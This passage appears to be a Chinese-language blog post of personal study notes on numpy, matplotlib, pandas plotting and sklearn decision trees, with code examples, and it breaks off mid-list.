    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E9%99%8D%E7%BB%B4">降维</a></li><li><a href="#npset_printoptions">np.set_printoptions</a></li><li><a href="#bicount">bicount</a></li><li><a href="#lexsort">lexsort</a></li><li><a href="#%E7%BB%83%E4%B9%A0%E9%A2%98">练习题</a></li></ul><ul><li><a href="#trick">Trick</a></li><li><a href="#matplotlib">Matplotlib</a><ul><li><a href="#%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">基本操作</a></li><li><a href="#%E9%A3%8E%E6%A0%BC">风格</a></li><li><a href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%94%BB%E5%9B%BE">面向对象画图</a></li></ul></li><li><a href="#%E7%BB%93%E5%90%88pandas%E7%94%BB%E5%9B%BE">结合pandas画图</a></li><li><a href="#sklearn">sklearn</a><ul><li><a href="#%E5%86%B3%E7%AD%96%E6%A0%91">决策树</a><ul><li><a href="#%E5%89%AA%E6%9E%9D%E7%AD%96%E7%95%A5">剪枝策略</a></li></ul></li><li><a href="#%E5%9B%9E%E5%BD%92%E6%A0%91">回归树</a></li><li><a href="#%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97">随机森林</a></li><li><a href="#%E9%A2%84%E5%A4%84%E7%90%86">预处理</a><ul><li><a href="#%E6%96%B9%E5%B7%AE%E8%BF%87%E6%BB%A4"><strong>方差过滤</strong></a></li><li><a href="#%E5%8D%A1%E6%96%B9%E8%BF%87%E6%BB%A4">卡方过滤</a></li><li><a href="#f%E6%A3%80%E9%AA%8C%E5%8F%AA%E8%83%BD%E6%A3%80%E9%AA%8C%E7%BA%BF%E6%80%A7%E5%85%B3%E7%B3%BB">F检验（只能检验线性关系）</a></li><li><a href="#%E4%BA%92%E4%BF%A1%E6%81%AF%E6%B3%95">互信息法</a></li></ul></li><li><a href="#%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B">特征工程</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86">数据预处理</a></li><li><a href="#%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92">逻辑回归</a></li><li><a href="#perceptrons">Perceptrons</a></li><li><a href="#logisticregression">LogisticRegression</a></li></ul></li><li><a href="#%E5%81%9A%E9%A2%98%E9%81%87%E5%88%B0%E7%9A%84">做题遇到的</a><ul><li><a href="#%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%96map">数据格式化map</a></li><li><a href="#%E7%B4%A2%E5%BC%95">索引</a></li><li><a href="#%E5%9D%90%E6%A0%87%E8%BD%B4%E6%98%BE%E7%A4%BA%E7%99%BE%E5%88%86%E6%AF%94">坐标轴显示百分比</a></li><li><a href="#apply">apply</a></li><li><a href="#%E9%87%8D%E9%87%87%E6%A0%B7">重采样</a></li><li><a href="#del">del</a></li><li><a href="#%E6%8C%89%E6%97%B6%E9%97%B4%E7%AD%9B%E9%80%89">按时间筛选</a></li><li><a href="#%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87">显示中文</a></li><li><a href="#%E9%87%8D%E5%91%BD%E5%90%8D">重命名</a></li><li><a href="#%E5%A1%AB%E5%85%85">填充</a></li><li><a href="#%E6%9F%A5%E8%AF%A2">查询</a></li><li><a href="#%E9%80%89%E6%8B%A9%E7%B1%BB%E5%9E%8B">选择类型</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%B1%95%E5%BC%80">数据展开</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E7%B4%AF%E5%8A%A0">数据累加</a></li><li><a href="#%E5%88%97%E6%93%8D%E4%BD%9C">列操作</a></li><li><a href="#%E8%A1%8C%E6%93%8D%E4%BD%9C">行操作</a></li><li><a href="#pivot%E4%B8%8Egroupby">pivot与groupby</a></li><li><a href="#unstack">unstack</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E8%81%9A%E5%90%88">数据聚合</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2">数据查询</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E6%B1%87%E6%80%BB">数据汇总</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%90%88%E5%B9%B6">数据合并</a></li><li><a href="#%E5%A4%9A%E4%B8%AAdf%E7%94%BB%E4%B8%80%E8%B5%B7">多个DF画一起</a></li><li><a href="#%E5%88%86%E6%9E%90%E5%92%8C%E6%8E%92%E5%BA%8F">分析和排序</a></li><li><a href="#%E5%8F%8C%E7%BA%B5%E5%9D%90%E6%A0%87%E8%BD%B4">双纵坐标轴</a></li><li><a href="#%E6%9E%84%E5%BB%BA%E7%A9%BAdf">构建空DF</a></li><li><a href="#%E6%9B%B4%E6%94%B9%E6%97%A5%E6%9C%9F%E9%97%B4%E9%9A%94">更改日期间隔</a></li><li><a href="#%E6%9F%A5%E7%9C%8B%E7%BB%9F%E8%AE%A1%E6%95%B0%E6%8D%AE">查看统计数据</a></li><li><a href="#%E4%BF%9D%E5%AD%98%E6%96%87%E4%BB%B6">保存文件</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86-1">数据预处理</a></li><li><a href="#%E5%88%A0%E9%99%A4%E7%A9%BA%E8%A1%8C">删除空行</a></li><li><a href="#%E6%9B%BF%E6%8D%A2">替换</a></li></ul></li><li><a href="#%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93">算法总结</a><ul><li><a href="#%E5%86%B3%E7%AD%96%E6%A0%91-1">决策树</a></li></ul></li></ul><!-- tocstop --><h3><span id="降维">降维</span></h3><ul><li>ravel()：如果没有必要，不会产生源数据的副本 </li><li>flatten()：返回源数据的副本 </li><li>squeeze()：只能对维数为1的维度降维</li><li>logspace 用于创建等比数列</li></ul><p>假如，我们想要改变基数，不让它以10为底数，我们可以改变base参数，将其设置为2试试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = np.logspace(<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,base=<span class="number">2</span>)</span><br><span class="line">a</span><br><span class="line">array([   <span class="number">1.</span>,    <span class="number">2.</span>,    <span class="number">4.</span>,    <span class="number">8.</span>,   <span class="number">16.</span>,   <span class="number">32.</span>,   <span class="number">64.</span>,  <span class="number">128.</span>,  <span class="number">256.</span>,  <span class="number">512.</span>])</span><br></pre></td></tr></table></figure><h3><span id="npset_printoptions">np.set_printoptions</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.set_printoptions(precision=None, threshold=None, edgeitems=None, linewidth=None, suppress=None, nanstr=None, infstr=None)</span><br></pre></td></tr></table></figure><p><strong>precision :</strong></p><p>　　int, optional，float输出的精度，即小数点后维数，默认8（ Number of digits of precision for floating point output (default 8)）</p><p><strong>threshold :</strong></p><p>　　int, optional，当数组数目过大时，设置显示几个数字，其余用省略号（Total number of array elements which trigger summarization rather than full repr (default 1000).）</p><p><strong>edgeitems :</strong></p><p>　　 int, optional，边缘数目（Number of array items in summary at beginning and end of each dimension (default 3)）.</p><p><strong>linewidth :</strong></p><p>　　 int, optional，线条宽度 The number of characters per line for the purpose of inserting line breaks (default 75).</p><p><strong>suppress :</strong></p><p>　　 bool, optional，是否压缩由科学计数法表示的浮点数（Whether or not suppress printing of small floating point values using scientific notation (default False).）</p><p><strong>nanstr :</strong></p><p>　　 str, optional，String representation of floating point not-a-number (default nan).</p><p><strong>infstr :</strong></p><p>　　str, optional，String representation of floating point infinity (default inf).</p><h3><span id="bicount">bicount</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 找到一个数组中最常出现的数字</span></span><br><span class="line">z = np.random.randint(<span class="number">0</span>,<span class="number">10</span>,<span class="number">50</span>)</span><br><span class="line">np.set_printoptions(threshold=<span class="number">1000</span>)</span><br><span class="line"><span class="built_in">print</span>(z)</span><br><span class="line"><span class="built_in">print</span>(np.bincount(z))</span><br><span class="line"><span class="built_in">print</span>(np.argmax(np.bincount(z)))</span><br><span class="line"></span><br><span class="line">[<span class="number">9</span> <span class="number">8</span> <span class="number">0</span> <span class="number">6</span> <span class="number">4</span> <span class="number">8</span> <span class="number">5</span> <span class="number">9</span> <span class="number">7</span> <span class="number">1</span> <span class="number">4</span> <span class="number">0</span> <span class="number">2</span> <span class="number">5</span> <span class="number">7</span> <span class="number">7</span> <span class="number">3</span> <span class="number">8</span> <span class="number">0</span> <span class="number">6</span> <span class="number">4</span> <span class="number">6</span> <span class="number">2</span> <span class="number">5</span> <span class="number">4</span> <span class="number">7</span> <span class="number">6</span> <span class="number">6</span> <span class="number">7</span> <span class="number">0</span> <span class="number">9</span> <span class="number">4</span> <span class="number">5</span> <span class="number">1</span> <span class="number">9</span> <span class="number">6</span> <span class="number">7</span> <span class="number">3</span> <span class="number">7</span> <span class="number">8</span> <span class="number">2</span> <span class="number">1</span> <span class="number">9</span> <span class="number">5</span> <span class="number">0</span> <span class="number">7</span> <span class="number">8</span> <span class="number">5</span> <span class="number">8</span> <span class="number">3</span>]</span><br><span class="line">[<span class="number">5</span> <span class="number">3</span> <span class="number">3</span> <span class="number">3</span> <span class="number">5</span> <span class="number">6</span> <span class="number">6</span> <span class="number">8</span> <span class="number">6</span> <span class="number">5</span>]</span><br><span class="line"><span class="number">7</span></span><br></pre></td></tr></table></figure><p>其实bicount将结果映射成一个list，分别代表0出现的次数，1出现的次数。。。</p><p>找到出现最多次数的下标就是找到一个数组中最常出现的数字</p><h3><span id="lexsort">lexsort</span></h3><p>numpy.lexsort() 用于对多个序列进行排序。把它想象成对电子表格进行排序，每一列代表一个序列，<strong>排序时优先照顾靠后的列</strong>。</p><p>这里举一个应用场景：小升初考试，重点班录取学生按照总成绩录取。在总成绩相同时，数学成绩高的优先录取，在总成绩和数学成绩都相同时，按照英语成绩录取…… 这里，总成绩排在电子表格的最后一列，数学成绩在倒数第二列，英语成绩在倒数第三列。</p><h3><span id="练习题">练习题</span></h3><h2><span id="trick">Trick</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">np.add? <span class="comment"># 显示帮助</span></span><br><span class="line">np.add?? <span class="comment"># 显示源代码</span></span><br><span class="line"><span class="comment"># fsting用法 python&gt;=3.6</span></span><br><span class="line">number = <span class="number">7</span></span><br><span class="line"><span class="string">f&#x27;My lucky number is <span class="subst">&#123;number&#125;</span>&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="matplotlib">Matplotlib</span></h2><ul><li><code>%matplotlib inline</code>: 这一句是IPython的魔法函数，可以在IPython编译器里直接使用，作用是内嵌画图，省略掉plt.show()这一步，直接显示图像。</li></ul><h3><span id="基本操作">基本操作</span></h3><ul><li><p>画图</p><p><code>plt.plot(x,y)</code></p></li><li><p>标签</p><p><code>plt.xlabel(&#39;xlabel&#39;,fontsize = 16)</code></p></li><li><p>线条&amp;颜色</p><table><thead><tr><th align="right">字符</th><th align="right">类型</th><th align="right">字符</th><th align="right">类型</th></tr></thead><tbody><tr><td align="right"><code>&#39;-&#39;</code></td><td align="right">实线</td><td align="right"><code>&#39;--&#39;</code></td><td align="right">虚线</td></tr><tr><td align="right"><code>&#39;-.&#39;</code></td><td align="right">虚点线</td><td align="right"><code>&#39;:&#39;</code></td><td align="right">点线</td></tr><tr><td align="right"><code>&#39;.&#39;</code></td><td align="right">点</td><td align="right"><code>&#39;,&#39;</code></td><td align="right">像素点</td></tr><tr><td align="right"><code>&#39;o&#39;</code></td><td align="right">圆点</td><td align="right"><code>&#39;v&#39;</code></td><td align="right">下三角点</td></tr><tr><td align="right"><code>&#39;^&#39;</code></td><td align="right">上三角点</td><td align="right"><code>&#39;&lt;&#39;</code></td><td align="right">左三角点</td></tr><tr><td align="right"><code>&#39;&gt;&#39;</code></td><td align="right">右三角点</td><td align="right"><code>&#39;1&#39;</code></td><td align="right">下三叉点</td></tr><tr><td align="right"><code>&#39;2&#39;</code></td><td align="right">上三叉点</td><td align="right"><code>&#39;3&#39;</code></td><td align="right">左三叉点</td></tr><tr><td align="right"><code>&#39;4&#39;</code></td><td align="right">右三叉点</td><td align="right"><code>&#39;s&#39;</code></td><td align="right">正方点</td></tr><tr><td align="right"><code>&#39;p&#39;</code></td><td align="right">五角点</td><td align="right"><code>&#39;*&#39;</code></td><td align="right">星形点</td></tr><tr><td align="right"><code>&#39;h&#39;</code></td><td align="right">六边形点1</td><td align="right"><code>&#39;H&#39;</code></td><td align="right">六边形点2</td></tr><tr><td align="right"><code>&#39;+&#39;</code></td><td align="right">加号点</td><td align="right"><code>&#39;x&#39;</code></td><td align="right">乘号点</td></tr><tr><td align="right"><code>&#39;D&#39;</code></td><td align="right">实心菱形点</td><td align="right"><code>&#39;d&#39;</code></td><td align="right">瘦菱形点</td></tr><tr><td align="right"><code>&#39;_&#39;</code></td><td align="right">横线点</td><td align="right"></td><td align="right"></td></tr></tbody></table><table><thead><tr><th align="right">字符</th><th align="right">颜色</th></tr></thead><tbody><tr><td align="right"><code>‘b’</code></td><td align="right">蓝色，blue</td></tr><tr><td align="right"><code>‘g’</code></td><td align="right">绿色，green</td></tr><tr><td align="right"><code>‘r’</code></td><td align="right">红色，red</td></tr><tr><td align="right"><code>‘c’</code></td><td align="right">青色，cyan</td></tr><tr><td align="right"><code>‘m’</code></td><td align="right">品红，magenta</td></tr><tr><td align="right"><code>‘y’</code></td><td align="right">黄色，yellow</td></tr><tr><td align="right"><code>‘k’</code></td><td align="right">黑色，black</td></tr><tr><td align="right"><code>‘w’</code></td><td align="right">白色，white</td></tr></tbody></table></li><li><p>线条风格：</p><p><code>plt.plot([1,2,3,4,5],[1,4,9,16,25],&#39;-.&#39;,color=&#39;r&#39;)</code></p><p>或者将两者结合使用</p><p><code>plt.plot([1,2,3,4,5],[1,4,9,16,25],&#39;ro&#39;)</code></p></li><li><p>线宽 linewidth</p><p><code>plt.plot(x,y,linewidth = 3.0)</code></p></li><li><p>子图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 211 表示一会要画的图是2行一列的 最后一个1表示的是子图当中的第1个图</span></span><br><span class="line">plt.subplot(<span class="number">211</span>)</span><br><span class="line">plt.plot(x,y,color=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 212 表示一会要画的图是2行一列的 最后一个1表示的是子图当中的第2个图</span></span><br><span class="line">plt.subplot(<span class="number">212</span>)</span><br><span class="line">plt.plot(x,y,color=<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>标题</p><p><code>plt.title(&#39;title&#39;)</code></p></li><li><p>文本</p><p><code>plt.text(x,y,&#39;text)</code></p><p>x,y为数轴上的坐标</p></li><li><p>网格</p><p><code>plt.grid(True)</code></p></li><li><p>注释</p><p><code>plt.annotate(&#39;tangyudi&#39;,xy=(-5,0),xytext=(-2,0.3),arrowprops = dict(facecolor=&#39;red&#39;,shrink=0.05,headlength= 20,headwidth = 20))</code></p></li></ul><h3><span id="风格">风格</span></h3><ul><li><p>查看风格：</p><p><code>plt.style.available</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;dark_background&#x27;,</span><br><span class="line"> &#x27;seaborn-talk&#x27;,</span><br><span class="line"> &#x27;seaborn-bright&#x27;,</span><br><span class="line"> &#x27;seaborn-ticks&#x27;,</span><br><span class="line"> &#x27;bmh&#x27;,</span><br><span class="line"> &#x27;ggplot&#x27;,</span><br><span class="line"> &#x27;seaborn-darkgrid&#x27;,</span><br><span class="line"> &#x27;classic&#x27;,</span><br><span class="line"> &#x27;fivethirtyeight&#x27;,</span><br><span class="line"> &#x27;seaborn-deep&#x27;,</span><br><span class="line"> &#x27;seaborn-colorblind&#x27;,</span><br><span class="line"> &#x27;seaborn-muted&#x27;,</span><br><span class="line"> &#x27;seaborn-pastel&#x27;,</span><br><span class="line"> &#x27;seaborn-notebook&#x27;,</span><br><span class="line"> &#x27;seaborn-paper&#x27;,</span><br><span class="line"> &#x27;seaborn-dark-palette&#x27;,</span><br><span class="line"> &#x27;seaborn-whitegrid&#x27;,</span><br><span class="line"> &#x27;seaborn-white&#x27;,</span><br><span class="line"> &#x27;grayscale&#x27;,</span><br><span class="line"> &#x27;seaborn-dark&#x27;,</span><br><span class="line"> &#x27;seaborn-poster&#x27;]</span><br></pre></td></tr></table></figure></li><li><p>使用风格<br><code>plt.style.use(&#39;ggplot&#39;)</code></p><p>Parameters</p><ul><li><p>style：str, dict, Path or list</p><p>A style specification. Valid options are:</p><ul><li><p>str: The name of a style or a path&#x2F;URL to a style file. For a list of available style names, see <a href="https://matplotlib.org/stable/api/style_api.html?highlight=style#matplotlib.style.matplotlib.style.available"><code>style.available</code></a>.</p></li><li><p>dict: Dictionary with valid key&#x2F;value pairs for <a href="https://matplotlib.org/stable/api/matplotlib_configuration_api.html#matplotlib.rcParams"><code>matplotlib.rcParams</code></a>.</p></li><li><p>Path: A path-like object which is a path to a style file.</p></li><li><p>list: A list of style specifiers (str, Path or dict) applied from first to last in the list.</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x = np.linspace(-<span class="number">10</span>,<span class="number">10</span>)</span><br><span class="line">y = np.sin(x)</span><br><span class="line">plt.style.use(<span class="string">&#x27;ggplot&#x27;</span>)</span><br><span class="line">plt.plot(x,y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></li></ul><h3><span id="面向对象画图">面向对象画图</span></h3><pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">x = np.arange(<span class="number">0</span>, math.pi*<span class="number">2</span>, <span class="number">0.05</span>)</span><br><span class="line">y = np.sin(x)</span><br><span class="line"><span class="comment">#创建图形对象</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line"><span class="comment">#我们使用 add_axes() 将 axes 轴域添加到画布中</span></span><br><span class="line"><span class="comment">#add_axes() 的参数值是一个序列，序列中的 4 个数字分别对应图形的左侧开始画图位置，底部开始画图位置，宽度缩放，和高度缩放，且每个数字必须介于 0 到 1 之间。</span></span><br><span class="line">ax=fig.add_axes([<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>])</span><br><span class="line">ax.plot(x,y)</span><br><span class="line">ax.set_title(<span class="string">&quot;sine wave&quot;</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;angle&#x27;</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;sine&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></code></pre><ul><li>图例</li></ul><p>axes 类的 legend() 方法负责绘制画布中的图例，它需要三个参数，如下所示：</p><p>ax.legend(handles, labels, loc)</p><ul><li>labels 是一个字符串序列，用来指定标签的名称；</li><li>loc 是指定图例位置的参数，其参数值可以用字符串或整数来表示；</li><li>handles 参数，它也是一个序列，它包含了所有线型的实例；</li></ul><p><a href="http://c.biancheng.net/matplotlib/">http://c.biancheng.net/matplotlib/</a></p><p><img src="https://pic3.zhimg.com/v2-cfe3dd3becbae38d3af4659b4ff1676a_r.jpg" alt="preview"></p><p><a href="https://zhuanlan.zhihu.com/p/139052035">https://zhuanlan.zhihu.com/p/139052035</a></p><p><img src="https://pic3.zhimg.com/80/v2-6e4429872eeb8a155433c0ee7c75b6ea_1440w.jpg" alt="img"></p><p><img src="https://pic2.zhimg.com/80/v2-124378df90b3ff1e24eb48c36af08dc9_1440w.jpg" alt="img"></p><p><a href="https://zhuanlan.zhihu.com/p/93423829">https://zhuanlan.zhihu.com/p/93423829</a></p><h2><span id="结合pandas画图">结合pandas画图</span></h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">df=pandas.<span class="title function_ invoke__">DataFrame</span>()</span><br><span class="line">常见的画图方法如下：</span><br><span class="line">df.<span class="title function_ invoke__">plot</span>()</span><br><span class="line">也可以传入参数：df.<span class="title function_ invoke__">plot</span>(kind=value)决定画什么类型的图</span><br><span class="line">kind=line    画折线图</span><br><span class="line">kind=bar     x轴画矩形图</span><br><span class="line">kind=barh    y轴画矩形图</span><br><span class="line">kind=pie     画饼图</span><br><span class="line">kind=scatter 画散点</span><br><span class="line">kind=<span class="keyword">box</span>     画盒子图</span><br><span class="line">kind=kde     画核密度估计图</span><br><span class="line"></span><br><span class="line">或者:</span><br><span class="line">df.plot.<span class="title function_ invoke__">line</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">bar</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">barh</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">pie</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">scatter</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">box</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">kde</span>()</span><br></pre></td></tr></table></figure><h2><span id="sklearn">sklearn</span></h2><h3><span id="决策树">决策树</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> tree</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">import</span> graphviz</span><br><span class="line"><span class="comment"># pandas拼接数据</span></span><br><span class="line">df = pd.concat([pd.DataFrame(wine.data), pd.DataFrame(wine.target)],axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 划分训练集和测试集</span></span><br><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(wine.data, wine.target, test_size=<span class="number">0.3</span>)</span><br><span class="line"><span class="comment"># 实例化一个分类器</span></span><br><span class="line">clf = tree.DecisionTreeClassifier(criterion=<span class="string">&#x27;entropy&#x27;</span>,random_state=<span class="number">3</span>,splitter=<span class="string">&quot;random&quot;</span>)</span><br><span class="line"><span class="comment"># 训练</span></span><br><span class="line">clf = clf.fit(Xtrain, Ytrain)</span><br><span class="line"><span class="comment"># 评价结果</span></span><br><span class="line">score = clf.score(Xtest, Ytest)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用graphviz画出决策树</span></span><br><span class="line">dot_data = tree.export_graphviz(clf, feature_names=wine.feature_names, class_names=[<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>], filled=<span class="literal">True</span>, rounded=<span class="literal">True</span>, special_characters=<span class="literal">True</span>)</span><br><span class="line">graph = graphviz.Source(dot_data)</span><br><span class="line">graph</span><br><span class="line"><span class="comment"># 确定最优剪枝参数</span></span><br><span class="line">test = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    clf = tree.DecisionTreeClassifier(criterion=<span class="string">&#x27;entropy&#x27;</span>,random_state=<span class="number">30</span>,</span><br><span class="line">                                      splitter=<span class="string">&quot;random&quot;</span>,</span><br><span class="line">                                     max_depth=i+<span class="number">1</span>,</span><br><span class="line">                                     )</span><br><span class="line">    clf = clf.fit(Xtrain, Ytrain)</span><br><span class="line">    score = clf.score(Xtest, Ytest)</span><br><span class="line">    test.append(score)</span><br><span class="line"></span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>), test, color=<span class="string">&#x27;red&#x27;</span>, label=<span class="string">&#x27;max_depth&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"><span class="comment"># 网格搜索</span></span><br><span class="line"><span class="comment"># 使用网格搜索，能够帮助我们同时调整多个参数，采用枚举法</span></span><br><span class="line">gini_thresholds = np.linspace(<span class="number">0</span>,<span class="number">0.5</span>,<span class="number">20</span>)</span><br><span class="line">entropy_thresholds = np.linspace(<span class="number">0</span>,<span class="number">1</span>,<span class="number">50</span>)</span><br><span class="line">parameters = &#123;</span><br><span class="line">    <span class="string">&quot;criterion&quot;</span>:(<span class="string">&#x27;gini&#x27;</span>,<span class="string">&#x27;entropy&#x27;</span>)</span><br><span class="line">    ,<span class="string">&quot;splitter&quot;</span>:(<span class="string">&#x27;best&#x27;</span>,<span class="string">&#x27;random&#x27;</span>)</span><br><span class="line">    ,<span class="string">&#x27;max_depth&#x27;</span>:[*<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line">    ,<span class="string">&#x27;min_samples_leaf&#x27;</span>:[*<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>,<span class="number">5</span>)]</span><br><span class="line">    ,<span class="string">&#x27;min_impurity_decrease&#x27;</span>:[*gini_thresholds]</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">clf = DecisionTreeClassifier(random_state=<span class="number">25</span>)</span><br><span class="line">GS = GridSearchCV(clf,parameters,cv=<span class="number">10</span>)</span><br><span class="line">GS.fit(Xtrain,Ytrain)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>特征重要性</li></ul><p><code>clf.feature_importances_</code></p><p><code>[*zip(feature_name,clf.feature_importances_)]</code></p><ul><li>Criterion这个参数正是用来决定不纯度的计算方法的。sklearn提供了两种选择：</li></ul><p>1）输入”entropy“，使用<strong>信息熵</strong>（Entropy） </p><p>2）输入”gini“，使用<strong>基尼系数</strong>（Gini Impurity）</p><blockquote><p>通常就使用基尼系数</p><p>数据维度很大，噪音很大时使用基尼系数</p><p>维度低，数据比较清晰的时候，信息熵和基尼系数没区别</p><p>当决策树的拟合程度不够的时候，使用信息熵</p><p>两个都试试，不好就换另外一个</p></blockquote><ul><li><strong>random_state 